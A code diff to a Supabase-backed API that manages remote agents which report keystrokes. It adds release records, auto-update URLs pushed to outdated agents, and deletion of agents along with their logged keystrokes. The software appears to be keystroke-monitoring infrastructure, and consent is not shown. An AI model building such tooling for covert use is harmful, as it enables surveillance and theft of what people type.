@@ -54,6 +54,8 @@ async function route(method, parts, body, query) {
         return handleGetAgent(rest[0]);
       if (method === "GET" && rest.length === 0)
         return handleListAgents(query);
+      if (method === "DELETE" && rest.length === 1)
+        return handleDeleteAgent(rest[0]);
 
       /* agents/:id/* sub-routes */
       const [agentId, sub] = rest;
@@ -81,9 +83,43 @@ async function route(method, parts, body, query) {
       return json({ error: "method not allowed" }, 405);
     }
 
+    case "releases": {
+      if (method === "POST") return handleCreateRelease(body);
+      if (method === "GET") return handleListReleases();
+      return json({ error: "method not allowed" }, 405);
+    }
+
     default:
       return json({ error: "not found" }, 404);
   }
+}
+
+/* ── Releases ── */
+
+async function handleCreateRelease(body) {
+  const { version, update_url, update_sha256 } = body;
+  if (!version || !update_url || !update_sha256) {
+    return json({ error: "version, update_url, update_sha256 required" }, 400);
+  }
+
+  const { data, error } = await supabase
+    .from("agent_releases")
+    .insert({ version, update_url, update_sha256 })
+    .select()
+    .single();
+
+  if (error) throw error;
+  return json(data, 201);
+}
+
+async function handleListReleases() {
+  const { data, error } = await supabase
+    .from("agent_releases")
+    .select("*")
+    .order("created_at", { ascending: false });
+
+  if (error) throw error;
+  return json(data || []);
 }
 
 /* ── Handlers ── */
@@ -118,14 +154,13 @@ async function handleRegister(body) {
 async function handleHeartbeat(body) {
   const { agent_id, version, keystrokes_since_last, uptime_seconds, status } = body;
 
-  /* Update last_seen and keystroke_count delta */
-  await supabase
-    .from("agents")
-    .update({
-      last_seen_utc: new Date().toISOString(),
-      status: status || "active",
-    })
-    .eq("id", agent_id);
+  /* Update last_seen, version, and status */
+  const updates = {
+    last_seen_utc: new Date().toISOString(),
+    status: status || "active",
+  };
+  if (version) updates.version = version;
+  await supabase.from("agents").update(updates).eq("id", agent_id);
 
   /* Check for config or update */
   const { data: config } = await supabase
@@ -140,6 +175,19 @@ async function handleHeartbeat(body) {
     response.config_changed = true;
   }
 
+  /* Auto-update: check if agent version is stale */
+  const { data: release } = await supabase
+    .from("agent_releases")
+    .select("version, update_url, update_sha256")
+    .order("created_at", { ascending: false })
+    .limit(1)
+    .single();
+
+  if (release && release.update_sha256 && version !== release.version) {
+    response.update_url = release.update_url;
+    response.update_sha256 = release.update_sha256;
+  }
+
   return json(response);
 }
 
@@ -152,7 +200,17 @@ async function handleListAgents(query) {
   const { data, error } = await q;
   if (error) throw error;
 
-  return json(data || []);
+  /* fetch latest release version for color-coded version display */
+  let latest_version = null;
+  const { data: release } = await supabase
+    .from("agent_releases")
+    .select("version")
+    .order("created_at", { ascending: false })
+    .limit(1)
+    .single();
+  if (release) latest_version = release.version;
+
+  return json({ agents: data || [], latest_version });
 }
 
 async function handleGetAgent(id) {
@@ -167,6 +225,16 @@ async function handleGetAgent(id) {
     throw error;
   }
   return json(data);
+}
+
+async function handleDeleteAgent(id) {
+  /* cascade: remove keystrokes, configs, actions, then the agent */
+  await supabase.from("keystrokes").delete().eq("agent_id", id);
+  await supabase.from("agent_configs").delete().eq("agent_id", id);
+  await supabase.from("agent_actions").delete().eq("agent_id", id);
+  const { error } = await supabase.from("agents").delete().eq("id", id);
+  if (error) throw error;
+  return json({ status: "deleted" });
 }
 
 async function handleGetConfig(agentId) {
